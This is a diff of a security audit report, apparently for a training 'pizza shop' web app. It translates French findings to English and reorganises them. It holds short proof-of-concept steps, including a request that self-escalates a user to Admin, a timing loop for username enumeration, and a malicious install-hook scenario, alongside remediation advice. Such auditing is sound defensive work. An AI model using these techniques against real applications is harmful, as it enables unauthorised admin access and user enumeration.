+- **Reference:** [CWE-319 - Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
 - **Constat:**
   - `nginx.conf` listens on both `80` and `443` in the same server block.
   - There is no explicit redirect from HTTP to HTTPS.
@@ -620,35 +511,22 @@ Unsafe Deserialization (CWE-502)
 - **PoC:**
   - Request the site over `http://app1.tiweb.tp.ubik.academy` and inspect whether the browser or proxy upgrades it automatically.
   - If not, credentials sent to `/login` or `/token` can be observed in cleartext by an on-path attacker.
-- **Remédiation:**
+- **Remediation:**
   - Add a dedicated HTTP server block that returns `301` to HTTPS.
   - Keep backend traffic internal only and expose only the TLS listener.
   - Add security headers at the proxy layer.
+  - Enforce HSTS to prevent fallback to HTTP in browsers.
 
-#### Cleartext Credential or Token Interception
-- **Gravité:** Élevée
-- **Référence:** CWE-319 - Cleartext Transmission of Sensitive Information: https://cwe.mitre.org/data/definitions/319.html
-- **Constat:**
-  - The login/register pages exchange credentials through the browser, and any HTTP fallback or proxy downgrade exposes them.
-  - The app stores the bearer token in browser storage and then reuses it on every request.
-- **Impact:**
-  - Passwords and tokens can be sniffed by a reverse proxy, browser extension, hostile Wi-Fi, or injected script if transport is not fully hardened.
-- **PoC:**
-  - Intercept the `/token` exchange in the browser DevTools or a proxy and inspect the form body and Authorization header.
-- **Remédiation:**
-  - Enforce HTTPS everywhere, including redirects from port 80.
-  - Use secure cookie-based sessions if possible instead of bearer tokens in the browser.
-  - Add HSTS so the browser never falls back to HTTP.
 
-#### Privilege Escalation: Self-Role Modification (CWE-269)
-- **Gravité:** Crítica
-- **Référence:** CWE-269 - Improper Access Control: https://cwe.mitre.org/data/definitions/269.html
+&nbsp;  
+#### Privilege Escalation: Self-Role Modification
+- **Severity:** Critical
+- **Reference:** [CWE-269 - Improper Access Control](https://cwe.mitre.org/data/definitions/269.html)
 - **Constat:**
-  - `schemas/user.py` line 13: `UserUpdate` includes `role: UserRole` field
-  - `routers/user.py` line 26: Update endpoint does NOT validate role change authorization
+  - Update endpoint in `routers/user.py` does NOT validate role change authorization (`schemas/user.py`'s, `UserUpdate` includes `role: UserRole` field)
   - Unprivileged users can POST with `"role": "Admin"` to escalate
 - **Impact:**
-  - Normal user → Admin escalation in single request
+  - Privilege escalation in single request
   - Full access to all admin endpoints (RCE, user management)
 - **PoC:**
   ```bash
@@ -664,19 +542,18 @@ Unsafe Deserialization (CWE-502)
   
   # Now exploit admin RCE
   ```
-- **Remédiation:**
+- **Remediation:**
   - Remove `role` field from `UserUpdate` schema
   - Or create separate admin-only endpoint for role changes
   - Add explicit authorization check preventing self-escalation
 
-#### Timing Attack Lure Vulnerability (CWE-697, CWE-208)
-- **Gravité:** Média
-- **Référence:** CWE-208 - Observable Timing Discrepancy: https://cwe.mitre.org/data/definitions/208.html
+
+&nbsp;  
+#### Timing Attack Lure Vulnerability
+- **Severity:** Medium
+- **Reference:** [CWE-208 - Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
 - **Constat:**
-  - `security/service.py` line 22: Hardcoded bcrypt hash `PROTECTION_AGAINST_TIMING_ATTACK` used as lure
-  - This **predictable** fake hash enables targeted timing attacks
-  - Attacker can enumerate usernames via response time measurement
-  - No constant-time password comparison in `verify_password()`
+  - In `security/service.py`, they try to use an hardcoded bcrypt hash (`PROTECTION_AGAINST_TIMING_ATTACK`) to avoid timing attacks enabling user enumeration. However, this hash is static and predictable.
 - **Impact:**
   - Username enumeration: valid users take slightly longer (real bcrypt) vs invalid (fake bcrypt)
   - Attacker distinguishes user existence via statistical timing analysis
@@ -692,35 +569,34 @@ Unsafe Deserialization (CWE-502)
   done
   # Analyze: real users should show slightly different timing
   ```
-- **Remédiation:**
+- **Remediation:**
   - Generate **random** lure hash at runtime (never reused)
   - Implement constant-time password comparison using `secrets.compare_digest()`
   - Rate limit `/token` endpoint to prevent timing attack exploitation
 
 
+&nbsp;  
+&nbsp;  
 ### Data Exposure
-- **Constat 2: exposition trop large des commentaires**
-  - L'endpoint `/pizza/{pizza_id}/comment/` ne filtre pas réellement par `pizza_id` et peut retourner l'ensemble des commentaires.
-- **Preuves (code):**
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/webserver/routers/comment.py`
-  - `MyPizzaApp/backend/src/awefull_pizza_shop/database/comment/service.py`
+#### Unrestricted Data Access via Unfiltered Endpoints
+- **Severity:** High
+- **Reference:** [CWE-639 - Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
+- **Constat:**
+  - The comment listing endpoint (`/pizza/{pizza_id}/comments/`) does not filter comments by `pizza_id` and returns all comments regardless of the pizza they belong to. This allows any user to access comments for all pizzas, which may include sensitive information or lead to further attacks.
 - **Impact:**
-  - Fuite de données inter-ressources, utile pour la reconnaissance et la préparation d'attaque.
+  - Data leakage: users can see comments that may contain sensitive information or internal discussions.
+  - Information gathering for further attacks (e.g., finding clues about admin activity or vulnerabilities).
+- **PoC:**
+  - Request `/api/pizza/1/comments/` and observe that it returns comments for all pizzas, not just pizza with ID 1.
+- **Remediation:**
+  - Filter comments by `pizza_id` in the database query to ensure only relevant comments are returned.
+  - Add authorization checks if comments contain sensitive information or should be restricted to certain users.
 
-- **Remédiations:**
-  - Interdire le HTML utilisateur (ou sanitization stricte côté serveur avec allowlist minimale).
-  - Supprimer `bypassSecurityTrustHtml` pour des données non fiables.
-  - Ne jamais injecter de token admin dans un navigateur automatisé déclenché par des entrées utilisateur.
-  - Filtrer strictement les commentaires par `pizza_id` côté repository.
-1.  **xss-poller.mjs: divulgation de version framework (Express)**
-      - **Référence (HTTP headers):** OWASP Secure Headers Project: https://owasp.org/www-project-secure-headers/
-    - **Verdict:** Confirmé (faible)
-    - **Pourquoi:** Express expose `X-Powered-By` par défaut.
-    - **Remédiation:**
-      - Ajouter `app.disable('x-powered-by')`.
 
-- **Gravité:** Faible à moyenne
-- **Référence:** CWE-425 - Direct Request for 'Hidden' File or Resource: https://cwe.mitre.org/data/definitions/425.html
+&nbsp;  
+#### Missing 404 Route and Predictable Error Handling
+- **Severity:** Low
+- **Reference:** [CWE-425 - Direct Request for 'Hidden' File or Resource](https://cwe.mitre.org/data/definitions/425.html)
 - **Constat:**
   - `app.routes.ts` has the wildcard route commented out.
   - Invalid routes are not centrally handled, which makes probing and error behavior more predictable.
@@ -729,40 +605,65 @@ Unsafe Deserialization (CWE-502)
   - Missing 404 routing often exposes application internals during probing.
 - **PoC:**
   - Navigate to random paths such as `/adminn`, `/pizza/../login`, or `/does-not-exist` and inspect the behavior.
-- **Remédiation:**
+- **Remediation:**
   - Reintroduce a catch-all route with a safe 404 component.
   - Make invalid routes return a consistent, non-informative response.
 
-- **Gravité:** Moyenne
-- **Référence:** CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor: https://cwe.mitre.org/data/definitions/200.html
+
+&nbsp;  
+#### Exposed Source Maps, Debug Info and Server Metadata
+- **Severity:** Medium
+- **Reference:** [CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html) & [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
 - **Constat:**
   - `environment.ts` ships the API base URL into the browser bundle.
   - `tsconfig.json` enables `sourceMap: true`, which is dangerous if production builds keep sourcemaps enabled.
-  - Sourcemaps and bundle artifacts can reveal source paths, component names, comments, and implementation details in Chrome DevTools.
+  - `alembic.ini` and `config.py` expose database credentials and JWT secrets in plaintext.
+  - Nginx does not hide server version or add security headers.
+  - `xss-poller.mjs` exposes the framework (Express) in `X-Powered-By` header.
 - **Impact:**
+  - Sourcemaps and bundle artifacts can reveal source paths, component names, comments, and implementation details in Chrome DevTools.
   - Attackers can reconstruct the frontend codebase and discover hidden routes or logic.
   - Internal endpoints, comments, and helper names become easier to target.
 - **PoC:**
   - Open DevTools on a production build and inspect loaded `.map` files or source trees.
-- **Remédiation:**
+- **Remediation:**
   - Disable sourcemaps for production unless they are access-controlled.
   - Keep environment files free of secrets.
   - Audit the build output to ensure no unintended debug metadata is shipped.
+  - Add security headers in Nginx:
+    - `Server: MyPizzaApp` (hide version)
+    - `X-Content-Type-Options: nosniff`
+    - `X-Frame-Options: DENY`
+    - `X-XSS-Protection: 1; mode=block`
+  - Add `app.disable('x-powered-by')` in Express to hide framework information.
+
+
 
 
 ### Supply Chain Vulnerabilities
-1. **Dockerfile-XSS-poller: npm install sans `--ignore-scripts`**
-   - **Verdict:** Confirmé (risque réel)
-   - **Pourquoi:** Les hooks `preinstall/postinstall` des dépendances NPM peuvent exécuter du code à la build.
-   - **Remédiation:**
-     - Privilégier `npm ci` avec lockfile.
-     - Ajouter `--ignore-scripts` si compatible avec les dépendances réellement nécessaires.
-     - Exécuter sous utilisateur non root si possible.
-1. **backend/Dockerfile: pip sans `--only-binary :all:`**
-   - **Verdict:** Confirmé (durcissement recommandé)
-   - **Pourquoi:** Sans contrainte binaire, `pip` peut construire depuis source et exécuter des scripts de build de dépendances.
-   - **Remédiation:**
-     - Ajouter `--only-binary :all:` lorsque possible.
-     - Utiliser des wheels de confiance.
-     - Exécuter l'installation dans une étape de build contrôlée.
----
+**Severity:** Low
+**Reference:** [CWE-494 - Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html) & [CWE-1395 - Dependency on Vulnerable Third-Party Component](https://cwe.mitre.org/data/definitions/1395.html) & [CWE-506 - Embedded Malicious Code](https://cwe.mitre.org/data/definitions/506.html)
+**Constat:**
+  - `Dockerfile-xss-poller` uses `npm install` without `--ignore-scripts`, allowing `preinstall/postinstall` hooks to run arbitrary code during build.
+  - `backend/Dockerfile` uses `pip install` without `--only-binary :all:`, allowing `setup.py` scripts of dependencies to execute code during installation.
+**Impact:**
+  - An attacker who can modify the dependency tree (e.g., via a compromised package or a malicious fork) can execute code during the build phase, potentially compromising the build environment or injecting malicious code into the final image.
+**PoC:**
+  - For `npm`, create a malicious package with a `preinstall` script that runs a command (e.g., `echo "Malicious code executed"`).
+  - For `pip`, create a package with a `setup.py` that executes code during installation.
+  - Build the Docker images and observe the execution of the malicious code in the build logs.
+**Remediation:**
+  - For `npm`, use `npm ci` with a lockfile to ensure deterministic builds and add `--ignore-scripts` if compatible with the dependencies.
+  - For `pip`, use `--only-binary :all:` to prevent building from source and ensure that only pre-built wheels are installed, or audit the dependencies for any that require building from source and review their setup scripts.
+
+
+
+&nbsp;  
+&nbsp;  
+## General Recommendations
+- Remove all hardcoded secrets and use environment variables or secret management.
+- Enforce strong JWT secrets and algorithms, and implement token rotation.
+- Implement proper server-side authorization checks for all privileged actions.
+- Implement rate limiting on authentication endpoints to prevent brute-force attacks.
+- Enforce strict input validation and sanitization on all user inputs.
+- Use secure cookie flags and enforce HTTPS to protect tokens in transit.
